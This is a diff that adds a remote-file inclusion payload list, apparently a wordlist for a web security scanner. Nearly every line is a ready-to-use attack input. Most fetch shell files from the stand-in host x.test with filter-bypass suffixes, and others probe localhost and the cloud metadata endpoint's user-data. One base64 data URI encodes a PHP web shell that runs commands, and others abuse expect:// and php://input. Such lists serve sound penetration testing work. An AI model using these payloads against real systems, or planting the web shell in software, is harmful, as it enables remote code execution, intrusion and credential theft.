@@ -1,0 +1,32 @@
+# category: rfi
+# description: Remote-file inclusion probes — HTTP(S), FTP, SMB, data/php wrappers hosted off-target.
+# references: OWASP RFI, HackTricks LFI/RFI.
+
+http://x.test/shell.txt
+https://x.test/shell.txt
+http://x.test/shell.php
+http://x.test/shell.phtml
+http://x.test/shell.phar
+http://x.test/shell.inc
+http://x.test/shell.phtml?
+http://x.test/shell.txt?.
+http://x.test/shell.txt%00
+http://x.test/shell.txt%00.jpg
+http://x.test/shell.php#
+http://x.test/shell.php?
+http://x.test/shell.txt%23
+ftp://x.test/shell.txt
+ftp://anonymous:anonymous@x.test/shell.php
+ftp://x.test:21/shell.txt
+smb://x.test/share/shell.php
+\\\\x.test\\share\\shell.txt
+//x.test/shell.txt
+/\x.test/shell.txt
+http://127.0.0.1/shell.txt
+http://localhost/shell.txt
+http://169.254.169.254/latest/user-data
+data://text/plain,<?php phpinfo();?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+expect://id
+php://input
+php://filter/convert.base64-encode/resource=http://x.test/shell.txt
